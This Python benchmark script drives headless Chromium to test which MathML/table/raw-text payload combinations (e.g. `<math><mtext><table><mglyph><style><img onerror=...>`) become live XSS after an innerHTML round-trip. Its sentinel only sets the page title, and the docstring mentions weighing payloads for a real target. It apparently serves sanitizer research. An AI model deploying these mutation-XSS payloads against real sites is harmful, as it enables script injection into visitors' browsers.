"""How wide is the bare-round-trip mutation family found by sanitizer_probe?

One payload -- `<math><mtext><table><mglyph><style><img onerror=...>` -- was
measured to go from inert to live across a plain innerHTML serialise-and-reparse,
with no sanitizer in the loop.  One example is a curiosity until you know its
shape: is it `mtext` specifically, `mglyph` specifically, `<style>` because it is
raw text, `<table>` because it foster-parents?  That determines what the sandbox
has to model, and whether the payload is worth putting in front of a real target.

So vary one factor at a time off the seed:

    integration point   mtext | mi | mo | mn | ms | annotation-xml(text/html)
    MathML exception    mglyph | malignmark | (none)
    table-scope opener  table | tbody | tr | (none)
    raw/RCDATA element  style | xmp | noembed | iframe | title | textarea
    sink                img onerror | svg onload | iframe src=javascript

Each case is measured as: live on first parse? live after the browser's own
round-trip?  `inert -> live` is the mutation signature.

Usage: python -m benchmark.mxss_family_probe
Writes benchmark/results/mxss_family.json
"""
from __future__ import annotations

import itertools
import json
import os
import sys

sys.path.insert(0, ".")
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

X = "__x()"                      # quote-free sentinel; see sanitizer_probe.py

INTEGRATION = ["mtext", "mi", "mo", "mn", "ms"]
EXCEPTION = ["mglyph", "malignmark", None]
TABLE_OPEN = ["table", "tbody", "tr", None]
RAWTAG = ["style", "xmp", "noembed", "iframe", "title", "textarea"]

PROBE = """
async (o) => {
  const arm = async (html) => {
    document.title = ''; document.body.innerHTML = '';
    const c = document.createElement('div');
    c.innerHTML = html;
    const ser = c.innerHTML;
    document.body.appendChild(c);
    await new Promise(r => setTimeout(r, o.settle));
    const fired = document.title === 'EXEC';
    document.title = ''; document.body.innerHTML = '';
    const d = document.createElement('div');
    d.innerHTML = ser;
    document.body.appendChild(d);
    await new Promise(r => setTimeout(r, o.settle));
    return [fired, document.title === 'EXEC', ser];
  };
  const [a, b, ser] = await arm(o.payload);
  return {first: a, roundtrip: b, serialized: ser};
}
"""


def build(integration, exception, table_open, rawtag) -> str:
    """Assemble the seed shape with one factor swapped at a time."""
    inner = ""
    if table_open:
        inner += f"<{table_open}>"
    if exception:
        inner += f"<{exception}>"
    inner += f"<{rawtag}><img src=x onerror=\"{X}\">"
    return f"<math><{integration}>{inner}"


def main() -> int:
    from playwright.sync_api import sync_playwright
    combos = list(itertools.product(INTEGRATION, EXCEPTION, TABLE_OPEN, RAWTAG))
    rows = []
    with sync_playwright() as p:
        b = p.chromium.launch()
        page = b.new_page()
        page.goto("about:blank")
        page.evaluate("() => { window.__x = function () "
                      "{ document.title = 'EXEC'; }; }")
        for integ, exc, top, raw in combos:
            payload = build(integ, exc, top, raw)
            r = page.evaluate(PROBE, {"payload": payload, "settle": 260})
            r.update({"integration": integ, "exception": exc,
                      "table_open": top, "rawtag": raw, "payload": payload,
                      "mxss": bool(r["roundtrip"] and not r["first"])})
            rows.append(r)
            if r["mxss"]:
                print(f"  MXSS  {integ:8s} {str(exc):12s} {str(top):7s} {raw}",
                      flush=True)
        b.close()

    out = os.path.join("benchmark", "results", "mxss_family.json")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    json.dump({"count": len(rows), "rows": rows},
              open(out, "w", encoding="utf-8"), ensure_ascii=False, indent=1)

    mx = [r for r in rows if r["mxss"]]
    live_first = [r for r in rows if r["first"]]
    print(f"\n=== {len(rows)} combinations ===")
    print(f"live on first parse (ordinary XSS)      : {len(live_first)}")
    print(f"inert -> live on bare round-trip (mXSS) : {len(mx)}")

    def tally(key):
        d = {}
        for r in mx:
            d[r[key]] = d.get(r[key], 0) + 1
        return d

    for key in ("integration", "exception", "table_open", "rawtag"):
        print(f"  which {key:12s} appear: {tally(key)}")
    print("\nRead: a factor with a single value in the tally is load-bearing;")
    print("a factor whose values all appear is not the reason the vector fires.")
    print("written:", out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
